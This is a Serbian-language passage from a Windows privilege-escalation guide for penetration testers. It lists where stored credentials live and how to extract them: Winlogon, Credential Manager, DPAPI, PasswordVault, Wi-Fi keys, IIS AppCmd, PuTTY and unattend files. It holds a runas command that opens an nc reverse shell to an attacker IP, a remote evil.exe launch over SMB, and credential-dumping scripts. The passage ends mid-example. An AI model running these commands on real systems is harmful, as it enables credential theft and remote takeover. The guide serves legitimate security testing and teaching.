Za lokalni listener, povežite njegov PID sa vlasnikom procesa, putanjom izvršne datoteke i servisom ili zakazanim zadatkom koji ga pokreće. Servis za daljinsko upravljanje može omogućiti pristup kao korisnik koji ga pokreće samo ako to dozvoljavaju njegova autentifikacija i kontrole komandi. Prilagođena TCP aplikacija koja radi pod nalogom sa višim privilegijama zaseban je cilj za analizu: listener i putanja binarne datoteke pasivni su tragovi, dok putanja za korupciju memorije koja zahteva autentifikaciju iziskuje analizu tačne binarne datoteke i ulaza koji joj je dostupan. Ako izgleda da izloženi port pripada sistemskom procesu, uporedite ga sa [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) pre nego što utvrdite koja je pozadinska usluga u pitanju; samo pravilo prosleđivanja ne dokazuje da je odredište dostupno ili ranjivo.

### Tabela rutiranja

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP tabela

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Pravila zaštitnog zida

[**Pogledajte ovu stranicu za komande povezane sa zaštitnim zidom**](../basic-cmd-for-pentesters.md#firewall) **(prikaz pravila, kreiranje pravila, isključivanje, isključivanje...)**

Još[ komandi za enumeraciju mreže ovde](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binarna datoteka `bash.exe` može se pronaći i u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root korisnika, možete osluškivati na bilo kom portu (kada prvi put upotrebite `nc.exe` za osluškivanje porta, GUI će vas pitati da li `nc` treba da bude dozvoljen kroz firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Da biste lako pokrenuli bash kao root, možete da probate `--default-user root`

Možete da istražite sistem datoteka `WSL` u fascikli `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Linux `root` unutar WSL-a sam po sebi ne daje administratorska prava u Windowsu. Ako trenutni Windows identitet može da čita sistem datoteka neke distribucije, pregledajte datoteke sa istorijom komandi ljuske (uključujući `/root/.bash_history`) u potrazi za komandama koje su možda zabeležile akreditive; eskalacija i dalje zahteva važeći nalog sa višim privilegijama i dozvoljen način autentifikacije. Raspored fascikli `LocalState\rootfs` važi za starije instalacije WSL-a; WSL 2 obično skladišti distribuciju na virtuelnom disku [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), zato najpre utvrdite koja je distribucija u pitanju i gde se nalazi njena memorija. Izbegavajte ispisivanje sadržaja istorije komandi tokom automatizovanog prikupljanja podataka.

## Windows akreditivi

### Winlogon akreditivi

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Tretirajte `DefaultUserName` i `DefaultDomainName` kao kontekst naloga, a ne kao akreditive. Neprazna vrednost `DefaultPassword` ili `AltDefaultPassword` predstavlja nalaz plaintext vrednosti u registru. Ako je `AutoAdminLogon=1`, ali nije moguće pročitati nijednu plaintext lozinku, to je samo naznaka: [Sysinternals Autologon može da čuva lozinku kao LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a obično čitanje registra ne potvrđuje da li taj secret postoji niti da li se može preuzeti. Proverite prava pristupa i stvarnu konfiguraciju prijavljivanja pre nego što prijavite izlaganje akreditiva.

### Menadžer akreditiva / Windows Vault

Preuzeto sa [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault čuva akreditive za servere, veb-sajtove i druge programe koje **Windows** može da koristi za **automatsko prijavljivanje korisnika**. Na prvi pogled, ovo može zvučati kao da korisnici mogu da sačuvaju akreditive za sajtove kao što su Facebook, Twitter ili Gmail i da se pregledači automatski prijavljuju, ali to ne funkcioniše tako.

Windows Vault čuva akreditive koje Windows može automatski da koristi za prijavljivanje korisnika, što znači da **svaka Windows aplikacija kojoj su potrebni akreditive za pristup resursu** (serveru ili veb-sajtu) **može da koristi ovaj Credential Manager** i Windows Vault, kao i da upotrebi obezbeđene akreditive umesto da korisnici svaki put unose korisničko ime i lozinku.

Osim ako aplikacije ne koriste Credential Manager, mislim da ne mogu da koriste akreditive za određeni resurs. Dakle, ako vaša aplikacija želi da koristi vault, trebalo bi nekako da **komunicira sa menadžerom akreditiva i zatraži akreditive za taj resurs** iz podrazumevanog vault skladišta.

Koristite `cmdkey` da biste prikazali sačuvane akreditive na računaru.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Zatim možete koristiti `runas` sa opcijom `/savecred` da biste upotrebili sačuvane akreditive. Sledeći primer poziva udaljeni binarni fajl preko SMB deljenja.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Korišćenje `runas` sa datim skupom pristupnih podataka.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Imajte na umu da to možete da uradite pomoću alata mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ili modula [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Moderne Windows UWP aplikacije, Microsoft Edge i moderne sistemske usluge čuvaju autentifikacione tokene i lozinke u čistom tekstu unutar Universal Windows Platform (UWP) `PasswordVault` skladišta (dostupnog i kao `Web Credentials` u `vaultcmd`). Ovo skladište je izolovano po sesiji i može da se dešifruje nativno, bez administratorskih prava ili prava `SeDebugPrivilege`.

Izvršite ovu PowerShell komandu u aktivnoj korisničkoj sesiji da biste odmah izlistali i dešifrovali sva sačuvana korisnička imena i lozinke u čistom tekstu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** pruža metod za simetrično šifrovanje podataka i pretežno se koristi u operativnom sistemu Windows za simetrično šifrovanje asimetričnih privatnih ključeva. Ovo šifrovanje koristi korisničku ili sistemsku tajnu kako bi značajno doprinelo entropiji.

**DPAPI omogućava šifrovanje ključeva pomoću simetričnog ključa izvedenog iz korisnikovih tajni za prijavljivanje**. U slučajevima kada se koristi sistemsko šifrovanje, upotrebljavaju se tajne za domen sistema.

Šifrovani korisnički RSA ključevi, šifrovani pomoću DPAPI-ja, čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, smešten zajedno sa glavnim ključem koji štiti korisnikove privatne ključeve u istoj datoteci**, obično se sastoji od 64 bajta nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, zbog čega se njegov sadržaj ne može prikazati komandom `dir` u CMD-u, ali može pomoću PowerShell-a.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Možete koristiti **mimikatz modul** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da biste ga dešifrovali.

**Datoteke sa akreditivima zaštićene glavnom lozinkom** obično se nalaze u:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Možete koristiti **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` za dešifrovanje.\
Možete **izvući mnogo DPAPI** **masterkeys** iz **memorije** pomoću modula `sekurlsa::dpapi` (ako imate root pristup).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell akreditivi

**PowerShell akreditivi** se često koriste za **skriptovanje** i zadatke automatizacije kao praktičan način za čuvanje šifrovanih akreditiva. Akreditivi su zaštićeni pomoću **DPAPI**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kom su kreirani.

Izvezeni akreditiv može imati proizvoljan naziv datoteke ili `.xml` putanju. Kada skripta ili popis datoteka ukaže na neki akreditiv, utvrdite stvarnu putanju profila naloga umesto da pretpostavite da je to `C:\Users`: [Windows može da smesti profile na druga mesta](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Čitljiva datoteka samo je trag; [Windows `Export-Clixml` vezuje šifrovani akreditiv za korisnika i računar koji su ga izvezli](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a svaki oporavljeni nalog mora zasebno da ima važeća ovlašćenja za željenu uslugu. Najpre proverite putanje i ACL-ove, bez ispisivanja šifrovanih ili nešifrovanih vrednosti tokom rutinskog popisivanja.

Da biste **dešifrovali** PowerShell akreditive iz datoteke koja ih sadrži, možete da uradite sledeće:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Sačuvane RDP veze

Možete ih pronaći u `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Nedavno pokrenute komande

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Menadžer akreditiva za udaljenu radnu površinu**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Koristite modul **Mimikatz** `dpapi::rdg` sa odgovarajućim `/masterkey` da biste **dešifrovali sve .rdg datoteke**\
Možete **izvući mnogo DPAPI masterkey vrednosti** iz memorije pomoću modula Mimikatz `sekurlsa::dpapi`

**mRemoteNG koristi drugačije skladište veza.** Pregledajte čitljive XML datoteke u `%APPDATA%\mRemoteNG` i korisničkim fasciklama Documents, uključujući datoteke uobičajenih naziva kao što je `config.xml`. Utvrdite šemu veza i šifrovane atribute `Password` pre nego što XML datoteku tretirate kao mogući izvor kredencijala. Sačuvana vrednost nije DPAPI/RDCMan lozinka; oporavak zavisi od postavki šifrovanja datoteke i od toga da li je korišćena prilagođena glavna lozinka. Izbegavajte ispisivanje šifrovanih vrednosti tokom opsežnog pronalaženja.

**Izvozi profila Remote Desktop Plus** mogu biti čitljivi i u korisničkim fasciklama ili deljenoj fascikli za administraciju. Zastareli izvoz `profiles.xml` sadrži unose `Data/Profile` sa elementima `ProfileName`, `Password` i `Secure`. Tretirajte neprazan element lozinke kao mogući izvor kredencijala, ali ga nemojte ispisivati niti pretpostavljati da sadrži tekst u otvorenom obliku: [dobavljač navodi](https://www.donkz.nl/) da zaštita profila može biti vezana za nalog i računar na kojima je profil kreiran ili konfigurisana sa blažim ograničenjima. Potvrdite poreklo datoteke i uslove oporavka pre nego što se oslonite na nju.

### Sticky Notes

Korisnici ponekad čuvaju lozinke i druge informacije u aplikacijama za lepljive beleške. Microsoftova upakovana aplikacija Sticky Notes obično čuva beleške na lokaciji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starije ili druge aplikacije mogu koristiti druga skladišta u korisničkom profilu, uključujući LevelDB. Utvrdite koja je aplikacija instalirana i koji format skladištenja koristi pre nego što odsustvo SQLite datoteke protumačite kao odsustvo beleški.

Ako Sticky Notes koristi SQLite write-ahead logging, kopija datoteke `plum.sqlite` sama možda neće sadržati nedavno potvrđene beleške. Uz doslednu kopiju baze podataka sačuvajte i odgovarajuću datoteku `plum.sqlite-wal`, a uključite i `plum.sqlite-shm` kada je dostupna; indeks u deljenoj memoriji može ponovo da se izgradi, ali WAL je deo trajnog stanja baze podataka. Pogledajte [SQLite WAL dokumentaciju](https://www.sqlite.org/wal.html). Beleška koja sadrži naziv naloga ili lozinku samo je mogući izvor kredencijala: zasebno proverite nalog, dozvoljeni pristup i ponovnu upotrebu lozinke. Za zapis iz šifrovanog menadžera lozinki potrebni su i stvarni ključ za dešifrovanje i tumačenje specifično za aplikaciju pre nego što se njime može potvrditi prijava sa višim privilegijama.

### AppCmd.exe

**Imajte na umu da za oporavak lozinki iz AppCmd.exe morate biti Administrator i pokrenuti proces na nivou High Integrity.**\
**AppCmd.exe** se nalazi u fascikli `%systemroot%\system32\inetsrv\`.\
Ako ova datoteka postoji, moguće je da su konfigurisani neki **kredencijali** koje je moguće **oporaviti**.

Ovaj kod je preuzet iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Proverite da li `C:\Windows\CCM\SCClient.exe` postoji .\
Instalateri se **pokreću sa SYSTEM privilegijama**, mnogi su ranjivi na **DLL Sideloading (informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Datoteke i Registry (akreditivi)

### Artefakti akreditiva u Registry-ju alata za podršku

Neke starije instalacije alata za daljinsku podršku zadržavaju nazive vrednosti povezane s lozinkama pod fiksnim ključevima aplikacije u Registry-ju. Na primer, prema [objašnjenju proizvođača o ključevima Registry-ja](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), `SecurityPasswordAES` u TeamViewer-u je označavao konfigurisanu statičku lozinku sesije u verzijama pre verzije 9. Oznaka u nazivu vrednosti samo je nagoveštaj za proveru: pre procene tog akreditiva proverite instaliranu verziju, da li su podaci vrednosti čitljivi, njihov format i trenutno ponašanje pri autentifikaciji. Prelazak sa lozinke za daljinsku podršku na privilegovaniji Windows nalog zahteva i stvarnu ponovnu upotrebu lozinke, kao i ovlašćenje za taj nalog. Ne uključujte šifrat i otkrivene lozinke u uobičajeni izlaz enumeracije.

### Deljene tabele sa zaštićenim listovima

Ako se sumnja da čitljiva deljena radna sveska sadrži podatke o nalozima, razlikujte **šifrovanje datoteke** od zaštite radnog lista ili skrivenih kolona. [Microsoft navodi](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) da zaštita radnog lista ograničava uređivanje i nije bezbednosna funkcija; ona sama po sebi ne potvrđuje da je sadržaj radne sveske šifrovan. Pregledajte samo ovlašćene i relevantne datoteke i nemojte ispisivati moguće tajne tokom opšte enumeracije. Čitljiva putanja do `.xlsx` datoteke, zaštićen list ili skrivena kolona sami po sebi ne dokazuju da akreditivi postoje niti da neki nalog ima veće privilegije; zasebno proverite stvarne podatke i trenutna prava naloga.

### Sačuvane zakrpe izmena CI servera

CI server može zadržati poslate izmene izvornog koda u svom direktorijumu podataka i nakon završetka izgradnje. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) da je `system/changes` skladište za izmene iz udaljenih pokretanja; direktorijum podataka može biti prilagođen i ne mora se nalaziti u `ProgramData`. Čitljiva zakrpa može sačuvati uklonjene ili dodate reference na datoteku sa akreditivima, ključ za šifrovanje ili skriptu koja koristi oboje. Na primer, PowerShell tok rada `ConvertTo-SecureString -Key` zahteva i AES ključ i šifrovani niz; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) da se ključ prosleđuje zasebno. Najpre pregledajte samo dostupne nazive zakrpa, a zatim, uz ovlašćenje, proverite relevantan sadržaj, bez ispisivanja tajni tokom uobičajene enumeracije. Putanja do zakrpe, šifrovana vrednost ili referenca na ključ sami po sebi ne dokazuju da je akreditiv važeći niti da omogućava pristup višim privilegijama. Ograničite ACL-ove direktorijuma podataka i izbegavajte unošenje tajni u izmene izgradnje.

### Prilagođeno menjanje lozinke lokalnog administratora

Domaća alatka za promenu lozinke može čuvati šifrovanu lozinku lokalnog administratora u lokalnoj usluzi, dok njene akreditive za skladište podataka drži u čitljivoj datoteci `.env` ili pored izvršne datoteke programa za ažuriranje. Zajedno proverite zakazani zadatak programa za ažuriranje, nalog, ACL-ove konfiguracije, listener i dozvole skladišta podataka. Skladištu podataka dostupnom samo preko loopback adrese i dalje može pristupiti lokalni korisnik koji ima važeće akreditive, ali sama autentifikacija ne dokazuje da ima dozvolu za čitanje relevantnih zapisa. Ako su seed za šifrovanje ili ključni materijal dostupni pored šifrata, proverite tačan postupak izvođenja ključa pre nego što se oslonite na šifrovanje. Šema koja deterministički izvodi AES ključ iz izloženog seed-a pomoću Go paketa [`math/rand`](https://pkg.go.dev/math/rand) nije pogodna za zaštitu te lozinke; Go navodi da taj paket nije prikladan za slučajnost osetljivu sa bezbednosnog stanovišta. Pre nego što oporavljenu lozinku smatrate putem za eskalaciju, potvrdite da je važeća i da pripada nalogu iz lokalne grupe Administrators. Zakazani zadatak, putanja do `.env` datoteke ili šifrovani blok sami po sebi ne dokazuju ništa od navedenog. Ne uključujte lozinke i ključni materijal u uobičajeni izlaz enumeracije.

Koristite [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) za upravljanje lozinkama lokalnih administratora. Njegovo skladištenje u direktorijumu ili iza Entra sistema i kontrole pristupa razlikuju se od prilagođenog lokalnog skladišta podataka; [uloge Elasticsearch-a](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) takođe određuju da li autentifikovani korisnik skladišta podataka može da čita određeni indeks.

### Arhive dodataka Java servera i ponovna upotreba akreditiva

Neki dodaci za Java servere distribuiraju se kao JAR arhive u direktorijumu servera `plugins`. Čitljiv prilagođeni dodatak može sadržati konfiguraciju ili bajtkod sa ugrađenim akreditivom usluge. Arhivu pregledajte samo uz ovlašćenje i ne uključujte otkrivene tajne u uobičajeni izlaz enumeracije. Sama putanja do dodatka ne dokazuje da tajna postoji, a otkrivena lozinka usluge omogućava veće privilegije samo ako važi i za privilegovaniji nalog. Proverite ACL-ove relevantnih datoteka i zamenite ponovo upotrebljene akreditive različitim tajnama. Pogledajte [uputstvo za instalaciju dodataka PaperMC-a](https://docs.papermc.io/paper/adding-plugins/) za raspored direktorijuma i [Oracle-ovu dokumentaciju za JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) za sadržaj arhive.

### Akreditivi ugrađene baze podataka Openfire-a

Instalacija Openfire-a koja koristi ugrađenu bazu podataka može čuvati `openfire.script` u direktorijumu `Openfire\embedded-db`. Ako trenutni nalog može da je čita, zajedno pregledajte zapise `OFUSER` i svojstvo `passwordKey`. Openfire-ova [dokumentacija o dobavljaču korisnika](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) navodi da lozinke mogu biti sačuvane u čistom tekstu ili šifrovane ključem koji se nalazi u tom svojstvu. Oporavljena lozinka važna je za eskalaciju samo ako je i dalje važeća za privilegovaniji identitet; samo ime datoteke ne dokazuje ni pristup za čitanje ni ponovnu upotrebu akreditiva. Putanja služi kao trag za inventarisanje, zato ne uključujte sadržaj baze podataka i akreditive u uobičajeni izlaz enumeracije.

Zasebna datoteka `Openfire\conf\openfire.xml` može otkriti konfigurisane portove i interfejs vezivanja administratorske konzole čak i kada se koristi spoljna baza podataka. Openfire obično vezuje administratorsku konzolu za loopback; lokalni nalog i dalje može da dosegne tu adresu ako listener radi. Zajedno proverite stvarni listener, ovlašćenu administratorsku ulogu, pravila za otpremanje dodataka i identitet Openfire usluge. Administrator koji može da instalira dodatak može izazvati izvršavanje njegovog koda u kontekstu usluge, što može značiti visoke privilegije kada se usluga izvršava kao LocalSystem. Podudaranje lozinke naloga ili čitljiva putanja do konfiguracije sami po sebi ne dokazuju pristup administratorskoj konzoli niti izvršavanje koda. Pogledajte proizvođačevo [uputstvo za instalaciju i upravljanje dodacima](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) i [API svojstvo za otpremanje dodataka](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracija servera za forenzičko upravljanje

Konfiguracije servera Velociraptor, koje se obično zovu `server.config.yaml`, mogu sadržati `CA.private_key` internog CA-a. Ako korisnik sa nižim privilegijama može da čita taj ključ, možda će moći da izda API klijentski sertifikat. Da li to vodi do viših privilegija zavisi od korisničkih uloga servera, dostupnosti API-ja i identiteta pod kojim se izvršava server ili ciljni agent. Klijentska konfiguracija sadrži drugačiji materijal; njeno pronalaženje ne dokazuje pristup CA-u servera. Neka okruženja čuvaju privatni ključ CA-a van mreže, pa čitljiva konfiguracija servera možda nema ni ključ za potpisivanje.

Na Windows serveru proverite ACL konfiguracije **servera** u instalacionom direktorijumu i svih zaštićenih rezervnih kopija. Jedna od mogućih lokacija je `%ProgramFiles%\VelociraptorServer\server.config.yaml`; koristite putanju podešenu za uslugu ako se razlikuje. Potvrdite da trenutni identitet može da čita datoteku i da je `CA.private_key` zaista prisutan. Ne ispisujte privatni ključ u evidencijama ili izlazu enumeracije. Proizvođačev tok rada `config api_client` koristi ključ CA-a za izdavanje klijentskog sertifikata, ali potrebna je i odgovarajuća uloga na serveru; njeno kreiranje ili menjanje može zahtevati pristup za upis u skladište podataka ili ponovno pokretanje. Postojeći privilegovani identitet servera može predstavljati put čak i kada ti upisi nisu mogući. API upiti sa pravima za izvršavanje pokreću se u odgovarajućem kontekstu servera ili agenta, koji može imati visoke privilegije.

Zaštitite konfiguraciju servera i rezervne kopije restriktivnim ACL-ovima, držite ključ za potpisivanje CA-a van mreže kada je to moguće i ograničite API uloge i pristup listener-u. Pogledajte [dokumentaciju Velociraptor API-ja](https://docs.velociraptor.app/docs/server_automation/server_api/) i [smernice za bezbednosnu konfiguraciju](https://docs.velociraptor.app/docs/deployment/security/).

### PuTTY akreditivi

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY je zaseban menadžer sesija. Njegovo izvorno šifrovano skladište može biti na lokaciji `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, dok izvezena rezervna kopija sesija može imati naziv `sessions-backup.dat` i biti sačuvana na drugom mestu. [SolarWinds-ov vodič za izvoz](https://thwack.solarwinds.com/discussion/comment/115591) navodi da su izvozi šifrovani lozinkom i da mogu da sadrže sesije, ključeve, skripte, oznake i veze; [forum za podršku](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) navodi lokaciju izvornog skladišta. Najpre proverite dozvole za datoteke i putanje. Pronalaženje bilo koje od tih datoteka ne otkriva njenu lozinku niti dokazuje da su sačuvani kredencijali i dalje važeći ili da imaju veće privilegije.

### Putty SSH host ključevi

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH ključevi u registru

SSH privatni ključevi mogu biti sačuvani unutar ključa registra `HKCU\Software\OpenSSH\Agent\Keys`, pa proverite da li se tamo nalazi nešto zanimljivo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ako pronađete bilo koji unos unutar te putanje, verovatno je reč o sačuvanom SSH ključu. Čuva se šifrovano, ali se lako može dešifrovati pomoću [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici možete pronaći ovde: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ako usluga `ssh-agent` nije pokrenuta, a želite da se automatski pokreće pri podizanju sistema, pokrenite:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Izgleda da ova tehnika više nije validna. Pokušao sam da napravim SSH ključeve, dodam ih pomoću `ssh-add` i prijavim se preko SSH-a na mašinu. Registar HKCU\Software\OpenSSH\Agent\Keys ne postoji, a procmon nije zabeležio korišćenje `dpapi.dll` tokom autentifikacije pomoću asimetričnih ključeva.

### Datoteke za automatsku instalaciju

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Ove datoteke možete potražiti i pomoću **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
